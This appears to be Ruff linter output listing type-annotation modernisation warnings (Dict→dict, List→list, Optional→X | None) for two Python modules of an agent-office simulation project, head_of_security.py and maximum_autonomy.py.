   --> src\app\miniature_office\core\head_of_security.py:216:26
    |
214 |         return self.unblocked_at is None
215 |
216 |     def to_dict(self) -> Dict:
    |                          ^^^^
217 |         return {
218 |             "block_id": self.block_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:242:29
    |
241 |     def __init__(self):
242 |         self.threat_models: Dict[str, ThreatModel] = {}
    |                             ^^^^
243 |         self.security_policies: Dict[str, SecurityPolicy] = {}
244 |         self.permissions: Dict[str, Permission] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:243:33
    |
241 |     def __init__(self):
242 |         self.threat_models: Dict[str, ThreatModel] = {}
243 |         self.security_policies: Dict[str, SecurityPolicy] = {}
    |                                 ^^^^
244 |         self.permissions: Dict[str, Permission] = {}
245 |         self.audits: Dict[str, SecurityAudit] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:244:27
    |
242 |         self.threat_models: Dict[str, ThreatModel] = {}
243 |         self.security_policies: Dict[str, SecurityPolicy] = {}
244 |         self.permissions: Dict[str, Permission] = {}
    |                           ^^^^
245 |         self.audits: Dict[str, SecurityAudit] = {}
246 |         self.lockdowns: Dict[str, Lockdown] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:245:22
    |
243 |         self.security_policies: Dict[str, SecurityPolicy] = {}
244 |         self.permissions: Dict[str, Permission] = {}
245 |         self.audits: Dict[str, SecurityAudit] = {}
    |                      ^^^^
246 |         self.lockdowns: Dict[str, Lockdown] = {}
247 |         self.blocked_deliveries: Dict[str, BlockedDelivery] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:246:25
    |
244 |         self.permissions: Dict[str, Permission] = {}
245 |         self.audits: Dict[str, SecurityAudit] = {}
246 |         self.lockdowns: Dict[str, Lockdown] = {}
    |                         ^^^^
247 |         self.blocked_deliveries: Dict[str, BlockedDelivery] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:247:34
    |
245 |         self.audits: Dict[str, SecurityAudit] = {}
246 |         self.lockdowns: Dict[str, Lockdown] = {}
247 |         self.blocked_deliveries: Dict[str, BlockedDelivery] = {}
    |                                  ^^^^
248 |
249 |         # Initialize core security policies
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:305:27
    |
303 |         tool_name: str,
304 |         justification: str,
305 |         expires_in_hours: Optional[int] = None,
    |                           ^^^^^^^^^^^^^
306 |     ) -> Permission:
307 |         """Grant tool access to an entity"""
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:368:80
    |
367 |     def approve_unsafe_operation(
368 |         self, entity_id: str, operation: str, justification: str, mitigations: List[str]
    |                                                                                ^^^^
369 |     ) -> Permission:
370 |         """Approve an unsafe operation with required mitigations"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:464:26
    |
463 |     def trigger_cross_floor_review(
464 |         self, floor_ids: List[str], concern: str
    |                          ^^^^
465 |     ) -> SecurityAudit:
466 |         """Trigger a cross-floor security review"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:496:68
    |
495 |     def block_delivery(
496 |         self, artifact_id: str, reason: str, required_mitigations: List[str]
    |                                                                    ^^^^
497 |     ) -> BlockedDelivery:
498 |         """Block an artifact delivery indefinitely until mitigations are applied"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:575:70
    |
574 |     def force_rearchitecture(
575 |         self, artifact_id: str, safety_issue: str, required_changes: List[str]
    |                                                                      ^^^^
576 |     ) -> bool:
577 |         """Force re-architecture of unsafe design"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:634:62
    |
632 |         return f"No security rejection found for {entity_id}"
633 |
634 |     def list_required_mitigations(self, artifact_id: str) -> List[str]:
    |                                                              ^^^^
635 |         """List required mitigations for an artifact"""
636 |         for block in self.blocked_deliveries.values():
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:661:68
    |
659 |         return False
660 |
661 |     def validate_absolute_limits(self, action: str) -> tuple[bool, Optional[str]]:
    |                                                                    ^^^^^^^^^^^^^
662 |         """
663 |         Validate that an action respects Head of Security absolute limits.
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:686:39
    |
684 |     # =========================================================================
685 |
686 |     def get_active_lockdowns(self) -> List[Dict]:
    |                                       ^^^^
687 |         """Get all active lockdowns"""
688 |         return [
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:686:44
    |
684 |     # =========================================================================
685 |
686 |     def get_active_lockdowns(self) -> List[Dict]:
    |                                            ^^^^
687 |         """Get all active lockdowns"""
688 |         return [
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:694:41
    |
692 |         ]
693 |
694 |     def get_blocked_deliveries(self) -> List[Dict]:
    |                                         ^^^^
695 |         """Get all currently blocked deliveries"""
696 |         return [
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:694:46
    |
692 |         ]
693 |
694 |     def get_blocked_deliveries(self) -> List[Dict]:
    |                                              ^^^^
695 |         """Get all currently blocked deliveries"""
696 |         return [
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\head_of_security.py:702:49
    |
700 |         ]
701 |
702 |     def get_active_permissions(self, entity_id: Optional[str] = None) -> List[Dict]:
    |                                                 ^^^^^^^^^^^^^
703 |         """Get active permissions, optionally filtered by entity"""
704 |         permissions = [p.to_dict() for p in self.permissions.values() if p.is_active()]
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:702:74
    |
700 |         ]
701 |
702 |     def get_active_permissions(self, entity_id: Optional[str] = None) -> List[Dict]:
    |                                                                          ^^^^
703 |         """Get active permissions, optionally filtered by entity"""
704 |         permissions = [p.to_dict() for p in self.permissions.values() if p.is_active()]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:702:79
    |
700 |         ]
701 |
702 |     def get_active_permissions(self, entity_id: Optional[str] = None) -> List[Dict]:
    |                                                                               ^^^^
703 |         """Get active permissions, optionally filtered by entity"""
704 |         permissions = [p.to_dict() for p in self.permissions.values() if p.is_active()]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:711:40
    |
709 |         return permissions
710 |
711 |     def get_security_policies(self) -> List[Dict]:
    |                                        ^^^^
712 |         """Get all security policies"""
713 |         return [policy.to_dict() for policy in self.security_policies.values()]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:711:45
    |
709 |         return permissions
710 |
711 |     def get_security_policies(self) -> List[Dict]:
    |                                             ^^^^
712 |         """Get all security policies"""
713 |         return [policy.to_dict() for policy in self.security_policies.values()]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\head_of_security.py:715:26
    |
713 |         return [policy.to_dict() for policy in self.security_policies.values()]
714 |
715 |     def to_dict(self) -> Dict:
    |                          ^^^^
716 |         """Export Head of Security state"""
717 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\maximum_autonomy.py:18:1
   |
16 | from datetime import datetime
17 | from enum import Enum
18 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\maximum_autonomy.py:18:1
   |
16 | from datetime import datetime
17 | from enum import Enum
18 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | # ============================================================================
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\core\maximum_autonomy.py:18:1
   |
16 | from datetime import datetime
17 | from enum import Enum
18 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | # ============================================================================
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\core\maximum_autonomy.py:18:1
   |
16 | from datetime import datetime
17 | from enum import Enum
18 | from typing import Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | # ============================================================================
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:130:31
    |
128 |     can_rollback: bool = True
129 |     escapes_automatically: bool = False  # Always False
130 |     integration_test_results: Dict[str, bool] = field(default_factory=dict)
    |                               ^^^^
131 |     security_test_results: Dict[str, bool] = field(default_factory=dict)
132 |     performance_metrics: Dict[str, float] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:131:28
    |
129 |     escapes_automatically: bool = False  # Always False
130 |     integration_test_results: Dict[str, bool] = field(default_factory=dict)
131 |     security_test_results: Dict[str, bool] = field(default_factory=dict)
    |                            ^^^^
132 |     performance_metrics: Dict[str, float] = field(default_factory=dict)
133 |     conflicts_resolved: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:132:26
    |
130 |     integration_test_results: Dict[str, bool] = field(default_factory=dict)
131 |     security_test_results: Dict[str, bool] = field(default_factory=dict)
132 |     performance_metrics: Dict[str, float] = field(default_factory=dict)
    |                          ^^^^
133 |     conflicts_resolved: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:133:25
    |
131 |     security_test_results: Dict[str, bool] = field(default_factory=dict)
132 |     performance_metrics: Dict[str, float] = field(default_factory=dict)
133 |     conflicts_resolved: List[str] = field(default_factory=list)
    |                         ^^^^
134 |
135 |     def flag_ready_for_review(self, flagged_by: str) -> None:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:161:16
    |
160 |     staging_id: str
161 |     artifacts: Dict[str, ProvisionalArtifact] = field(default_factory=dict)
    |                ^^^^
162 |     active_integrations: List[str] = field(default_factory=list)
163 |     cross_floor_contracts: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:162:26
    |
160 |     staging_id: str
161 |     artifacts: Dict[str, ProvisionalArtifact] = field(default_factory=dict)
162 |     active_integrations: List[str] = field(default_factory=list)
    |                          ^^^^
163 |     cross_floor_contracts: List[str] = field(default_factory=list)
164 |     test_suites_running: Set[str] = field(default_factory=set)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:163:28
    |
161 |     artifacts: Dict[str, ProvisionalArtifact] = field(default_factory=dict)
162 |     active_integrations: List[str] = field(default_factory=list)
163 |     cross_floor_contracts: List[str] = field(default_factory=list)
    |                            ^^^^
164 |     test_suites_running: Set[str] = field(default_factory=set)
165 |     conflicts_being_resolved: Dict[str, str] = field(default_factory=dict)
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:164:26
    |
162 |     active_integrations: List[str] = field(default_factory=list)
163 |     cross_floor_contracts: List[str] = field(default_factory=list)
164 |     test_suites_running: Set[str] = field(default_factory=set)
    |                          ^^^
165 |     conflicts_being_resolved: Dict[str, str] = field(default_factory=dict)
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:165:31
    |
163 |     cross_floor_contracts: List[str] = field(default_factory=list)
164 |     test_suites_running: Set[str] = field(default_factory=set)
165 |     conflicts_being_resolved: Dict[str, str] = field(default_factory=dict)
    |                               ^^^^
166 |
167 |     def add_provisional_artifact(
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:187:58
    |
185 |         return artifact_id
186 |
187 |     def run_integration_tests(self, artifact_id: str) -> Dict[str, bool]:
    |                                                          ^^^^
188 |         """Run integration tests on artifact"""
189 |         if artifact_id not in self.artifacts:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:203:55
    |
201 |         return artifact.integration_test_results
202 |
203 |     def run_security_tests(self, artifact_id: str) -> Dict[str, bool]:
    |                                                       ^^^^
204 |         """Run security tests on artifact"""
205 |         if artifact_id not in self.artifacts:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:219:66
    |
217 |         return artifact.security_test_results
218 |
219 |     def resolve_conflicts_organically(self, artifact_id: str) -> List[str]:
    |                                                                  ^^^^
220 |         """Allow conflicts to resolve organically in staging"""
221 |         if artifact_id not in self.artifacts:
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\maximum_autonomy.py:236:48
    |
234 |         return conflicts_resolved
235 |
236 |     def get_staging(self, artifact_id: str) -> Optional[ProvisionalArtifact]:
    |                                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
237 |         """Get staging artifact"""
238 |         return self.artifacts.get(artifact_id)
    |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:266:14
    |
264 |     formation_reason: TeamFormationReason
265 |     formation_tick: int
266 |     members: Set[str] = field(default_factory=set)
    |              ^^^
267 |     projects: List[str] = field(default_factory=list)
268 |     competing_with: Set[str] = field(default_factory=set)  # Other team IDs
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:267:15
    |
265 |     formation_tick: int
266 |     members: Set[str] = field(default_factory=set)
267 |     projects: List[str] = field(default_factory=list)
    |               ^^^^
268 |     competing_with: Set[str] = field(default_factory=set)  # Other team IDs
269 |     disbanded: bool = False
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:268:21
    |
266 |     members: Set[str] = field(default_factory=set)
267 |     projects: List[str] = field(default_factory=list)
268 |     competing_with: Set[str] = field(default_factory=set)  # Other team IDs
    |                     ^^^
269 |     disbanded: bool = False
270 |     disband_tick: Optional[int] = None
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\maximum_autonomy.py:270:19
    |
268 |     competing_with: Set[str] = field(default_factory=set)  # Other team IDs
269 |     disbanded: bool = False
270 |     disband_tick: Optional[int] = None
    |                   ^^^^^^^^^^^^^
271 |
272 |     def recruit_member(self, agent_id: str, recruited_by: str) -> bool:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:291:12
    |
289 |     """
290 |
291 |     teams: Dict[str, SelfOrganizingTeam] = field(default_factory=dict)
    |            ^^^^
292 |     team_competitions: Dict[str, List[str]] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:292:24
    |
291 |     teams: Dict[str, SelfOrganizingTeam] = field(default_factory=dict)
292 |     team_competitions: Dict[str, List[str]] = field(default_factory=dict)
    |                        ^^^^
293 |
294 |     def form_team(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:292:34
    |
291 |     teams: Dict[str, SelfOrganizingTeam] = field(default_factory=dict)
292 |     team_competitions: Dict[str, List[str]] = field(default_factory=dict)
    |                                  ^^^^
293 |
294 |     def form_team(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:301:26
    |
299 |         reason: TeamFormationReason,
300 |         tick: int,
301 |         initial_members: List[str],
    |                          ^^^^
302 |     ) -> str:
303 |         """Form new self-organizing team (no permission needed)"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:380:19
    |
378 |     influence_type: LoungeInfluenceType
379 |     target_idea: str
380 |     participants: List[str]
    |                   ^^^^
381 |     strength: float  # 0.0 to 1.0
382 |     created_tick: int
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:390:60
    |
388 |     can_merge_to_production: bool = False
389 |
390 |     def verify_hard_limits(self, attempted_action: str) -> Tuple[bool, str]:
    |                                                            ^^^^^
391 |         """Verify action doesn't violate hard limits"""
392 |         if attempted_action == "override_security":
    |
help: Replace with `tuple`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:421:21
    |
419 |     agent_id: str
420 |     reputation_level: int
421 |     active_effects: Set[ReputationEffect] = field(default_factory=set)
    |                     ^^^
422 |     collaborators_attracted: List[str] = field(default_factory=list)
423 |     reviews_expedited: List[str] = field(default_factory=list)
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:422:30
    |
420 |     reputation_level: int
421 |     active_effects: Set[ReputationEffect] = field(default_factory=set)
422 |     collaborators_attracted: List[str] = field(default_factory=list)
    |                              ^^^^
423 |     reviews_expedited: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:423:24
    |
421 |     active_effects: Set[ReputationEffect] = field(default_factory=set)
422 |     collaborators_attracted: List[str] = field(default_factory=list)
423 |     reviews_expedited: List[str] = field(default_factory=list)
    |                        ^^^^
424 |
425 |     # Caps (absolute)
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:442:53
    |
440 |         return True
441 |
442 |     def verify_caps(self, attempted_action: str) -> Tuple[bool, str]:
    |                                                     ^^^^^
443 |         """Verify action doesn't exceed reputation caps"""
444 |         if attempted_action == "override_veto":
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:473:20
    |
471 |     human_id: str
472 |     interaction_mode: VRInteractionMode
473 |     active_agents: List[str] = field(default_factory=list)
    |                    ^^^^
474 |     demonstrations: List[Dict] = field(default_factory=list)
475 |     debates: List[Dict] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:474:21
    |
472 |     interaction_mode: VRInteractionMode
473 |     active_agents: List[str] = field(default_factory=list)
474 |     demonstrations: List[Dict] = field(default_factory=list)
    |                     ^^^^
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:474:26
    |
472 |     interaction_mode: VRInteractionMode
473 |     active_agents: List[str] = field(default_factory=list)
474 |     demonstrations: List[Dict] = field(default_factory=list)
    |                          ^^^^
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:475:14
    |
473 |     active_agents: List[str] = field(default_factory=list)
474 |     demonstrations: List[Dict] = field(default_factory=list)
475 |     debates: List[Dict] = field(default_factory=list)
    |              ^^^^
476 |     side_conversations: List[Dict] = field(default_factory=list)
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:475:19
    |
473 |     active_agents: List[str] = field(default_factory=list)
474 |     demonstrations: List[Dict] = field(default_factory=list)
475 |     debates: List[Dict] = field(default_factory=list)
    |                   ^^^^
476 |     side_conversations: List[Dict] = field(default_factory=list)
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:476:25
    |
474 |     demonstrations: List[Dict] = field(default_factory=list)
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
    |                         ^^^^
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:476:30
    |
474 |     demonstrations: List[Dict] = field(default_factory=list)
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
    |                              ^^^^
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:477:15
    |
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |               ^^^^
478 |
479 |     # Safety
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:477:25
    |
475 |     debates: List[Dict] = field(default_factory=list)
476 |     side_conversations: List[Dict] = field(default_factory=list)
477 |     factions: Dict[str, List[str]] = field(default_factory=dict)
    |                         ^^^^
478 |
479 |     # Safety
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:500:29
    |
499 |     def agents_debate(
500 |         self, participants: List[str], topic: str, interruptions_allowed: bool = True
    |                             ^^^^
501 |     ) -> str:
502 |         """Agents debate passionately (interruptions allowed)"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:515:56
    |
513 |         return debate_id
514 |
515 |     def form_faction(self, faction_name: str, members: List[str]) -> str:
    |                                                        ^^^^
516 |         """Form faction in VR (social only, no production power)"""
517 |         self.factions[faction_name] = members
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:537:16
    |
535 |     """
536 |
537 |     proposals: List[Dict] = field(default_factory=list)
    |                ^^^^
538 |     active_improvements: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:537:21
    |
535 |     """
536 |
537 |     proposals: List[Dict] = field(default_factory=list)
    |                     ^^^^
538 |     active_improvements: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:538:26
    |
537 |     proposals: List[Dict] = field(default_factory=list)
538 |     active_improvements: List[str] = field(default_factory=list)
    |                          ^^^^
539 |
540 |     def propose_continuous_refactoring(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:614:24
    |
612 |     staging_reality: StagingReality
613 |     team_dynamics: TeamDynamics
614 |     floor_initiatives: Dict[str, FloorInitiative] = field(default_factory=dict)
    |                        ^^^^
615 |     lounge_influences: Dict[str, LoungeInfluence] = field(default_factory=dict)
616 |     reputation_leadership: Dict[str, ReputationLeadership] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:615:24
    |
613 |     team_dynamics: TeamDynamics
614 |     floor_initiatives: Dict[str, FloorInitiative] = field(default_factory=dict)
615 |     lounge_influences: Dict[str, LoungeInfluence] = field(default_factory=dict)
    |                        ^^^^
616 |     reputation_leadership: Dict[str, ReputationLeadership] = field(default_factory=dict)
617 |     vr_staging_views: Dict[str, VRLiveStagingView] = field(default_factory=dict)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:616:28
    |
614 |     floor_initiatives: Dict[str, FloorInitiative] = field(default_factory=dict)
615 |     lounge_influences: Dict[str, LoungeInfluence] = field(default_factory=dict)
616 |     reputation_leadership: Dict[str, ReputationLeadership] = field(default_factory=dict)
    |                            ^^^^
617 |     vr_staging_views: Dict[str, VRLiveStagingView] = field(default_factory=dict)
618 |     project_ai_self_care: ProjectAISelfCare = field(default_factory=ProjectAISelfCare)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:617:23
    |
615 |     lounge_influences: Dict[str, LoungeInfluence] = field(default_factory=dict)
616 |     reputation_leadership: Dict[str, ReputationLeadership] = field(default_factory=dict)
617 |     vr_staging_views: Dict[str, VRLiveStagingView] = field(default_factory=dict)
    |                       ^^^^
618 |     project_ai_self_care: ProjectAISelfCare = field(default_factory=ProjectAISelfCare)
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:621:21
    |
620 |     # Safety Backstops (Only 4 absolute stops)
621 |     absolute_stops: Set[str] = field(
    |                     ^^^
622 |         default_factory=lambda: {
623 |             "human_production_seal",
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:663:35
    |
661 |         source_sandbox_id: str,
662 |         promoted_by: str,
663 |         integration_requirements: List[str],
    |                                   ^^^^
664 |     ) -> str:
665 |         """Promote sandbox work to staging reality"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:683:26
    |
681 |         founder: str,
682 |         reason: TeamFormationReason,
683 |         initial_members: List[str],
    |                          ^^^^
684 |     ) -> str:
685 |         """Form self-organizing team (no permission needed)"""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:718:23
    |
716 |         influence_type: LoungeInfluenceType,
717 |         target_idea: str,
718 |         participants: List[str],
    |                       ^^^^
719 |         strength: float,
720 |     ) -> str:
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:739:10
    |
737 |     def verify_lounge_influence_limits(
738 |         self, influence_id: str, attempted_action: str
739 |     ) -> Tuple[bool, str]:
    |          ^^^^^
740 |         """Verify lounge influence doesn't exceed limits"""
741 |         if influence_id in self.lounge_influences:
    |
help: Replace with `tuple`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:766:10
    |
764 |     def verify_reputation_caps(
765 |         self, agent_id: str, attempted_action: str
766 |     ) -> Tuple[bool, str]:
    |          ^^^^^
767 |         """Verify reputation doesn't exceed caps"""
768 |         if agent_id in self.reputation_leadership:
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:799:57
    |
798 |     def vr_form_faction(
799 |         self, view_id: str, faction_name: str, members: List[str]
    |                                                         ^^^^
800 |     ) -> str:
801 |         """Form faction in VR (social only)"""
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:808:10
    |
806 |     def human_seal_for_production(
807 |         self, staging_id: str, human_id: str, approval_reason: str
808 |     ) -> Dict:
    |          ^^^^
809 |         """Human seals artifact for production (ONLY absolute approval)"""
810 |         if staging_id not in self.staging_reality.artifacts:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\maximum_autonomy.py:824:79
    |
822 |         }
823 |
824 |     def human_veto(self, staging_id: str, human_id: str, veto_reason: str) -> Dict:
    |                                                                               ^^^^
825 |         """Human vetos staging artifact"""
826 |         if staging_id not in self.staging_reality.artifacts:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
